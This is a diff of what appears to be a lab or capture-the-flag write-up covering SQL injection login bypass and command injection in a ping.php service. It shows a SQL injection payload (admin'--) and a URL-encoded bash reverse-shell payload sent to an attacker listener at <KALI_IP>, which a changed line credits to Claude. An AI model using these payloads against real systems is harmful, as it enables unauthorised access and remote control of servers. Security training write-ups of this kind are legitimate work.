@@ -64,7 +64,7 @@ The login form at `/admin/` is vulnerable to SQL injection. The PHP source (retr
 $query = "SELECT id, username FROM users WHERE username='$u' AND password='$p'";
 ```
 
-Payload in the username field (aslo posted in password field, as both fields needed to be used):
+Payload in the username field (also posted in password field, as both fields needed to be used):
 
 ```
 admin'--
@@ -83,7 +83,7 @@ Notes:    Service account for /admin/sysmaint-checks/ping.php. Do not disable.
 ```
 
 **Failed attempt — sqlmap on the lookup endpoint:**  
-I tried running sqlmap against the `?id=` parameter. sqlmap found no injection because the parameter is cast to an integer via `intval()` — string-based payloads don't apply here. The lookup page is not an attack vector.
+I tried running sqlmap against the `?id=` parameter. sqlmap found no injection because the parameter is cast to an integer via `intval()` — string-based payloads don't apply here. The lookup page is not an attack vector. It's purpose is to hint at the service running (ping.php)
 
 ### 3. Command Injection — ping.php
 
@@ -103,7 +103,7 @@ Listener on Kali:
 nc -lvnp 4444
 ```
 
-Payload:
+Payload (created by claude, space replaced by '+'):
 
 ```
 host=127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/<KALI_IP>/4444+0>%261'
